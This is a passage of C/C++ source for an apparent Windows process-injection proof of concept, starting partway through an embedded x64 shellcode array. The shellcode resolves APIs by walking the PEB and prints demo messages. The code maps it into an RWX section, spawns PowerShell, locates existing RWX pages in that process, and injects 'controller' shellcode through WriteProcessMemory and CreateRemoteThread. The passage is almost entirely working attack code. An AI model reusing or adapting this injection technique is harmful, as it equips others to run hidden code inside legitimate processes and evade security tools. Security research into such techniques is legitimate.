		"\x00\x6F\xC6\x84\x24\x09\x01\x00\x00\x64\xC6\x84\x24\x0A\x01\x00"
		"\x00\x65\xC6\x84\x24\x0B\x01\x00\x00\x21\xC6\x84\x24\x0C\x01\x00"
		"\x00\x20\xC6\x84\x24\x0D\x01\x00\x00\x4D\xC6\x84\x24\x0E\x01\x00"
		"\x00\x65\xC6\x84\x24\x0F\x01\x00\x00\x6D\xC6\x84\x24\x10\x01\x00"
		"\x00\x6F\xC6\x84\x24\x11\x01\x00\x00\x72\xC6\x84\x24\x12\x01\x00"
		"\x00\x79\xC6\x84\x24\x13\x01\x00\x00\x20\xC6\x84\x24\x14\x01\x00"
		"\x00\x76\xC6\x84\x24\x15\x01\x00\x00\x69\xC6\x84\x24\x16\x01\x00"
		"\x00\x73\xC6\x84\x24\x17\x01\x00\x00\x69\xC6\x84\x24\x18\x01\x00"
		"\x00\x62\xC6\x84\x24\x19\x01\x00\x00\x6C\xC6\x84\x24\x1A\x01\x00"
		"\x00\x65\xC6\x84\x24\x1B\x01\x00\x00\x20\xC6\x84\x24\x1C\x01\x00"
		"\x00\x66\xC6\x84\x24\x1D\x01\x00\x00\x6F\xC6\x84\x24\x1E\x01\x00"
		"\x00\x72\xC6\x84\x24\x1F\x01\x00\x00\x20\xC6\x84\x24\x20\x01\x00"
		"\x00\x31\xC6\x84\x24\x21\x01\x00\x00\x35\xC6\x84\x24\x22\x01\x00"
		"\x00\x20\xC6\x84\x24\x23\x01\x00\x00\x73\xC6\x84\x24\x24\x01\x00"
		"\x00\x65\xC6\x84\x24\x25\x01\x00\x00\x63\xC6\x84\x24\x26\x01\x00"
		"\x00\x6F\xC6\x84\x24\x27\x01\x00\x00\x6E\xC6\x84\x24\x28\x01\x00"
		"\x00\x64\xC6\x84\x24\x29\x01\x00\x00\x73\xC6\x84\x24\x2A\x01\x00"
		"\x00\x0A\xC6\x84\x24\x2B\x01\x00\x00\x00\xC6\x84\x24\xA0\x00\x00"
		"\x00\x48\xC6\x84\x24\xA1\x00\x00\x00\x65\xC6\x84\x24\xA2\x00\x00"
		"\x00\x6C\xC6\x84\x24\xA3\x00\x00\x00\x6C\xC6\x84\x24\xA4\x00\x00"
		"\x00\x6F\xC6\x84\x24\xA5\x00\x00\x00\x20\xC6\x84\x24\xA6\x00\x00"
		"\x00\x66\xC6\x84\x24\xA7\x00\x00\x00\x72\xC6\x84\x24\xA8\x00\x00"
		"\x00\x6F\xC6\x84\x24\xA9\x00\x00\x00\x6D\xC6\x84\x24\xAA\x00\x00"
		"\x00\x20\xC6\x84\x24\xAB\x00\x00\x00\x6D\xC6\x84\x24\xAC\x00\x00"
		"\x00\x61\xC6\x84\x24\xAD\x00\x00\x00\x70\xC6\x84\x24\xAE\x00\x00"
		"\x00\x70\xC6\x84\x24\xAF\x00\x00\x00\x65\xC6\x84\x24\xB0\x00\x00"
		"\x00\x64\xC6\x84\x24\xB1\x00\x00\x00\x20\xC6\x84\x24\xB2\x00\x00"
		"\x00\x73\xC6\x84\x24\xB3\x00\x00\x00\x68\xC6\x84\x24\xB4\x00\x00"
		"\x00\x65\xC6\x84\x24\xB5\x00\x00\x00\x6C\xC6\x84\x24\xB6\x00\x00"
		"\x00\x6C\xC6\x84\x24\xB7\x00\x00\x00\x63\xC6\x84\x24\xB8\x00\x00"
		"\x00\x6F\xC6\x84\x24\xB9\x00\x00\x00\x64\xC6\x84\x24\xBA\x00\x00"
		"\x00\x65\xC6\x84\x24\xBB\x00\x00\x00\x21\xC6\x84\x24\xBC\x00\x00"
		"\x00\x0A\xC6\x84\x24\xBD\x00\x00\x00\x00\xC6\x84\x24\xC0\x00\x00"
		"\x00\x47\xC6\x84\x24\xC1\x00\x00\x00\x6F\xC6\x84\x24\xC2\x00\x00"
		"\x00\x6F\xC6\x84\x24\xC3\x00\x00\x00\x64\xC6\x84\x24\xC4\x00\x00"
		"\x00\x62\xC6\x84\x24\xC5\x00\x00\x00\x79\xC6\x84\x24\xC6\x00\x00"
		"\x00\x65\xC6\x84\x24\xC7\x00\x00\x00\x21\xC6\x84\x24\xC8\x00\x00"
		"\x00\x20\xC6\x84\x24\xC9\x00\x00\x00\x55\xC6\x84\x24\xCA\x00\x00"
		"\x00\x6E\xC6\x84\x24\xCB\x00\x00\x00\x6D\xC6\x84\x24\xCC\x00\x00"
		"\x00\x61\xC6\x84\x24\xCD\x00\x00\x00\x70\xC6\x84\x24\xCE\x00\x00"
		"\x00\x70\xC6\x84\x24\xCF\x00\x00\x00\x69\xC6\x84\x24\xD0\x00\x00"
		"\x00\x6E\xC6\x84\x24\xD1\x00\x00\x00\x67\xC6\x84\x24\xD2\x00\x00"
		"\x00\x20\xC6\x84\x24\xD3\x00\x00\x00\x61\xC6\x84\x24\xD4\x00\x00"
		"\x00\x6E\xC6\x84\x24\xD5\x00\x00\x00\x64\xC6\x84\x24\xD6\x00\x00"
		"\x00\x20\xC6\x84\x24\xD7\x00\x00\x00\x73\xC6\x84\x24\xD8\x00\x00"
		"\x00\x6C\xC6\x84\x24\xD9\x00\x00\x00\x65\xC6\x84\x24\xDA\x00\x00"
		"\x00\x65\xC6\x84\x24\xDB\x00\x00\x00\x70\xC6\x84\x24\xDC\x00\x00"
		"\x00\x69\xC6\x84\x24\xDD\x00\x00\x00\x6E\xC6\x84\x24\xDE\x00\x00"
		"\x00\x67\xC6\x84\x24\xDF\x00\x00\x00\x20\xC6\x84\x24\xE0\x00\x00"
		"\x00\x66\xC6\x84\x24\xE1\x00\x00\x00\x6F\xC6\x84\x24\xE2\x00\x00"
		"\x00\x72\xC6\x84\x24\xE3\x00\x00\x00\x20\xC6\x84\x24\xE4\x00\x00"
		"\x00\x33\xC6\x84\x24\xE5\x00\x00\x00\x30\xC6\x84\x24\xE6\x00\x00"
		"\x00\x20\xC6\x84\x24\xE7\x00\x00\x00\x73\xC6\x84\x24\xE8\x00\x00"
		"\x00\x65\xC6\x84\x24\xE9\x00\x00\x00\x63\xC6\x84\x24\xEA\x00\x00"
		"\x00\x6F\xC6\x84\x24\xEB\x00\x00\x00\x6E\xC6\x84\x24\xEC\x00\x00"
		"\x00\x64\xC6\x84\x24\xED\x00\x00\x00\x73\xC6\x84\x24\xEE\x00\x00"
		"\x00\x0A\xC6\x84\x24\xEF\x00\x00\x00\x00\x48\x8D\x8C\x24\x68\x01"
		"\x00\x00\xE8\x49\x04\x00\x00\x48\x89\x84\x24\x30\x01\x00\x00\x48"
		"\x83\xBC\x24\x30\x01\x00\x00\x00\x75\x0A\xB8\x01\x00\x00\x00\xE9"
		"\xEC\x01\x00\x00\x48\x8D\x54\x24\x50\x48\x8B\x8C\x24\x30\x01\x00"
		"\x00\xE8\xE2\x01\x00\x00\x48\x89\x84\x24\x98\x01\x00\x00\x48\x83"
		"\xBC\x24\x98\x01\x00\x00\x00\x75\x0A\xB8\x02\x00\x00\x00\xE9\xBD"
		"\x01\x00\x00\x48\x8D\x94\x24\x90\x00\x00\x00\x48\x8B\x8C\x24\x30"
		"\x01\x00\x00\xE8\xB0\x01\x00\x00\x48\x89\x84\x24\xA0\x01\x00\x00"
		"\x48\x83\xBC\x24\xA0\x01\x00\x00\x00\x75\x0A\xB8\x03\x00\x00\x00"
		"\xE9\x8B\x01\x00\x00\x48\x8B\x84\x24\x98\x01\x00\x00\x48\x89\x84"
		"\x24\xB0\x01\x00\x00\x48\x8B\x84\x24\xA0\x01\x00\x00\x48\x89\x84"
		"\x24\x60\x01\x00\x00\x48\x8D\x4C\x24\x40\xFF\x94\x24\xB0\x01\x00"
		"\x00\x48\x89\x84\x24\xC8\x01\x00\x00\x48\x8D\x54\x24\x60\x48\x8B"
		"\x8C\x24\x30\x01\x00\x00\xFF\x94\x24\x60\x01\x00\x00\x48\x89\x84"
		"\x24\xB8\x01\x00\x00\x48\x8D\x54\x24\x70\x48\x8B\x8C\x24\x30\x01"
		"\x00\x00\xFF\x94\x24\x60\x01\x00\x00\x48\x89\x84\x24\xC0\x01\x00"
		"\x00\x48\x8D\x94\x24\x80\x00\x00\x00\x48\x8B\x8C\x24\x30\x01\x00"
		"\x00\xFF\x94\x24\x60\x01\x00\x00\x48\x89\x84\x24\x90\x01\x00\x00"
		"\x48\x8D\x54\x24\x34\x48\x8B\x8C\x24\x30\x01\x00\x00\xFF\x94\x24"
		"\x60\x01\x00\x00\x48\x89\x84\x24\xA8\x01\x00\x00\xB9\xF5\xFF\xFF"
		"\xFF\xFF\x94\x24\xB8\x01\x00\x00\x48\x89\x84\x24\x88\x01\x00\x00"
		"\xB9\xFF\xFF\xFF\xFF\xFF\x94\x24\xC0\x01\x00\x00\x48\xC7\x44\x24"
		"\x20\x00\x00\x00\x00\x45\x33\xC9\x41\xB8\x3B\x00\x00\x00\x48\x8D"
		"\x94\x24\xF0\x00\x00\x00\x48\x8B\x8C\x24\x88\x01\x00\x00\xFF\x94"
		"\x24\x90\x01\x00\x00\xB9\xE8\x03\x00\x00\xFF\x94\x24\xA8\x01\x00"
		"\x00\xC7\x44\x24\x30\x01\x00\x00\x00\xEB\x0A\x8B\x44\x24\x30\xFF"
		"\xC0\x89\x44\x24\x30\x83\x7C\x24\x30\x0F\x7D\x49\x8B\x44\x24\x30"
		"\x99\xB9\x05\x00\x00\x00\xF7\xF9\x8B\xC2\x85\xC0\x75\x29\x48\xC7"
		"\x44\x24\x20\x00\x00\x00\x00\x45\x33\xC9\x41\xB8\x1D\x00\x00\x00"
		"\x48\x8D\x94\x24\xA0\x00\x00\x00\x48\x8B\x8C\x24\x88\x01\x00\x00"
		"\xFF\x94\x24\x90\x01\x00\x00\xB9\xE8\x03\x00\x00\xFF\x94\x24\xA8"
		"\x01\x00\x00\xEB\xA6\x48\xC7\x44\x24\x20\x00\x00\x00\x00\x45\x33"
		"\xC9\x41\xB8\x30\x00\x00\x00\x48\x8D\x94\x24\xC0\x00\x00\x00\x48"
		"\x8B\x8C\x24\x88\x01\x00\x00\xFF\x94\x24\x90\x01\x00\x00\x33\xC0"
		"\x48\x81\xC4\xD8\x01\x00\x00\xC3\x48\x89\x54\x24\x10\x48\x89\x4C"
		"\x24\x08\x48\x83\xEC\x78\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x89"
		"\x44\x24\x30\x48\x8B\x44\x24\x30\x0F\xB7\x00\x3D\x4D\x5A\x00\x00"
		"\x74\x07\x33\xC0\xE9\x02\x02\x00\x00\x48\x8B\x44\x24\x30\x48\x63"
		"\x40\x3C\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1"
		"\x48\x89\x44\x24\x40\xB8\x08\x00\x00\x00\x48\x6B\xC0\x00\x48\x8B"
		"\x4C\x24\x40\x48\x8D\x84\x01\x88\x00\x00\x00\x48\x89\x44\x24\x38"
		"\x48\x8B\x44\x24\x38\x83\x38\x00\x75\x07\x33\xC0\xE9\xBA\x01\x00"
		"\x00\x48\x8B\x44\x24\x38\x8B\x00\x89\x44\x24\x18\x8B\x44\x24\x18"
		"\x48\x03\x84\x24\x80\x00\x00\x00\x48\x89\x44\x24\x10\x48\x8B\x44"
		"\x24\x10\x8B\x40\x18\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x10\x8B"
		"\x40\x1C\x89\x44\x24\x24\x48\x8B\x44\x24\x10\x8B\x40\x20\x89\x44"
		"\x24\x1C\x48\x8B\x44\x24\x10\x8B\x40\x24\x89\x44\x24\x20\x48\xC7"
		"\x44\x24\x08\x00\x00\x00\x00\xEB\x0D\x48\x8B\x44\x24\x08\x48\xFF"
		"\xC0\x48\x89\x44\x24\x08\x48\x8B\x44\x24\x48\x48\x39\x44\x24\x08"
		"\x0F\x83\x43\x01\x00\x00\x8B\x44\x24\x1C\x48\x8B\x8C\x24\x80\x00"
		"\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x4C\x24\x08\x48\x8D\x04"
		"\x88\x48\x89\x44\x24\x58\x8B\x44\x24\x20\x48\x8B\x8C\x24\x80\x00"
		"\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x4C\x24\x08\x48\x8D\x04"
		"\x48\x48\x89\x44\x24\x50\x8B\x44\x24\x24\x48\x8B\x8C\x24\x80\x00"
		"\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x8B\x4C\x24\x50\x0F\xB7\x09"
		"\x48\x8D\x04\x88\x48\x89\x44\x24\x60\x48\x8B\x44\x24\x58\x8B\x00"
		"\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89"
		"\x44\x24\x28\x48\xC7\x04\x24\x00\x00\x00\x00\x48\xC7\x04\x24\x00"
		"\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04\x24"
		"\x48\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00\x00\x00\x48\x03\xC8\x48"
		"\x8B\xC1\x0F\xBE\x00\x85\xC0\x74\x45\x48\x8B\x04\x24\x48\x8B\x4C"
		"\x24\x28\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x74\x2F\x48"
		"\x8B\x04\x24\x48\x8B\x8C\x24\x88\x00\x00\x00\x48\x03\xC8\x48\x8B"
		"\xC1\x0F\xBE\x00\x48\x8B\x0C\x24\x48\x8B\x54\x24\x28\x48\x03\xD1"
		"\x48\x8B\xCA\x0F\xBE\x09\x3B\xC1\x74\x02\xEB\x02\xEB\x97\x48\x8B"
		"\x04\x24\x48\x8B\x8C\x24\x88\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1"
		"\x0F\xBE\x00\x85\xC0\x75\x2D\x48\x8B\x04\x24\x48\x8B\x4C\x24\x28"
		"\x48\x03\xC8\x48\x8B\xC1\x0F\xBE\x00\x85\xC0\x75\x17\x48\x8B\x44"
		"\x24\x60\x8B\x00\x48\x8B\x8C\x24\x80\x00\x00\x00\x48\x03\xC8\x48"
		"\x8B\xC1\xEB\x07\xE9\xA0\xFE\xFF\xFF\x33\xC0\x48\x83\xC4\x78\xC3"
		"\x48\x89\x4C\x24\x08\x56\x57\x48\x83\xEC\x68\x48\xC7\x44\x24\x30"
		"\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x89\x44"
		"\x24\x30\x48\x8B\x44\x24\x30\x48\x8B\x40\x18\x48\x89\x44\x24\x38"
		"\x48\x8D\x44\x24\x48\x48\x8B\x4C\x24\x38\x48\x8B\xF8\x48\x8D\x71"
		"\x10\xB9\x10\x00\x00\x00\xF3\xA4\x48\x8B\x44\x24\x48\x48\x89\x44"
		"\x24\x40\x48\x8B\x44\x24\x40\x48\x89\x44\x24\x20\x48\x83\x7C\x24"
		"\x20\x00\x0F\x84\xC6\x01\x00\x00\x48\x8B\x44\x24\x20\x48\x83\x78"
		"\x30\x00\x0F\x84\xB6\x01\x00\x00\x48\x8B\x44\x24\x20\x48\x83\x78"
		"\x60\x00\x75\x02\xEB\xD6\x48\x8B\x44\x24\x20\x48\x8B\x40\x60\x48"
		"\x89\x44\x24\x18\x48\xC7\x04\x24\x00\x00\x00\x00\x48\xC7\x04\x24"
		"\x00\x00\x00\x00\xEB\x0B\x48\x8B\x04\x24\x48\xFF\xC0\x48\x89\x04"
		"\x24\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04"
		"\x48\x85\xC0\x0F\x84\x23\x01\x00\x00\x48\x8B\x44\x24\x18\x48\x8B"
		"\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x0F\x84\x0E\x01\x00\x00\x48\x8B"
		"\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xF8"
		"\x5A\x7F\x50\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F"
		"\xB7\x04\x48\x83\xF8\x41\x7C\x3B\x48\x8B\x84\x24\x80\x00\x00\x00"
		"\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83\xE8\x41\x83\xC0\x61\x89\x44"
		"\x24\x28\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7"
		"\x54\x24\x28\x66\x89\x14\x48\x0F\xB7\x44\x24\x28\x66\x89\x44\x24"
		"\x08\xEB\x15\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F"
		"\xB7\x04\x48\x66\x89\x44\x24\x08\x0F\xB7\x44\x24\x08\x66\x89\x44"
		"\x24\x0C\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x83"
		"\xF8\x5A\x7F\x47\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04"
		"\x48\x83\xF8\x41\x7C\x35\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F"
		"\xB7\x04\x48\x83\xE8\x41\x83\xC0\x61\x89\x44\x24\x2C\x48\x8B\x44"
		"\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x54\x24\x2C\x66\x89\x14\x48\x0F"
		"\xB7\x44\x24\x2C\x66\x89\x44\x24\x0A\xEB\x12\x48\x8B\x44\x24\x18"
		"\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x66\x89\x44\x24\x0A\x0F\xB7\x44"
		"\x24\x0A\x66\x89\x44\x24\x10\x0F\xB7\x44\x24\x0C\x0F\xB7\x4C\x24"
		"\x10\x3B\xC1\x74\x02\xEB\x05\xE9\xBA\xFE\xFF\xFF\x48\x8B\x84\x24"
		"\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x75\x1C"
		"\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x75"
		"\x0B\x48\x8B\x44\x24\x20\x48\x8B\x40\x30\xEB\x14\x48\x8B\x44\x24"
		"\x20\x48\x8B\x00\x48\x89\x44\x24\x20\xE9\x2E\xFE\xFF\xFF\x33\xC0"
		"\x48\x83\xC4\x68\x5F\x5E\xC3\x00\x00\x00\x00\x00\x00\x00\x00\x00";

	uint32_t payload_size = sizeof payload_buf;

	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
	RtlInitUnicodeString2 = (MyRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

	HANDLE hSection = nullptr;
	NTSTATUS NtStatus;
	LARGE_INTEGER max_size;
	max_size.QuadPart = controller_size + 4000;

	uint8_t* pMapBuf = nullptr, * pMappedCode = nullptr;
	uint64_t qwMapBufSize;
	uint8_t* prMapBuf = nullptr, * prMappedCode = nullptr;

	OBJECT_ATTRIBUTES LocalAttributes;
	UNICODE_STRING szName;
	RtlInitUnicodeString2(&szName, L"\\Sessions\\1\\BaseNamedObjects\\My");
	InitializeObjectAttributes(&LocalAttributes, &szName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, &LocalAttributes, &max_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr); // THIS IS GOOD ONE

	qwMapBufSize = 0;
	NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)&pMapBuf, 0, 0, nullptr, (PSIZE_T)&qwMapBufSize, 1, 0, PAGE_EXECUTE_READWRITE);
	uint32_t dwOldProtect = 0;
	memcpy(pMapBuf, payload_buf, payload_size);

	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION pi = { 0 };
	printf("Spawning Powershell target\r\n");
	BOOL success = CreateProcessA("C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	printf("Holding until target process is initialized...\r\n");
	Sleep(2000);

	printf("Locating existing RWX region that is safe for injection...\r\n");
	DWORD pid = pi.dwProcessId;
	DWORD pid2 = GetProcessId(pi.hProcess);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	MEMORY_BASIC_INFORMATION mbi = {};
	HANDLE process = OpenProcess(MAXIMUM_ALLOWED, false, pid);
	DWORD64 BaseAddress = 0;

	HMODULE hMods[1024];
	HANDLE pHandle = process;

	int one_page_in_a_row = 0;
	LPCVOID offset = 0;
	if (process)
	{
		while (VirtualQueryEx(process, offset, &mbi, sizeof(mbi)))
		{
			offset = (LPVOID)((DWORD64)mbi.BaseAddress + mbi.RegionSize);
			if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
			{
				if (mbi.RegionSize == 0x1000) {
					one_page_in_a_row += 1;
				}
				else {
					one_page_in_a_row = 0;
				}
				if (one_page_in_a_row == 3) {
					printf("Found the target address: (0x%08X)\r\n", mbi.BaseAddress);
					WriteProcessMemory(process, LPVOID(mbi.BaseAddress), controller_buf, controller_size, NULL);
					CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL);
					break;
				}
			}
		}
		offset = 0;
	}
	printf("RWX section injected with controller shellcode.\r\n");
	printf("Watch console output in Powershell to see the payload get mapped and unmapped!\r\n");

}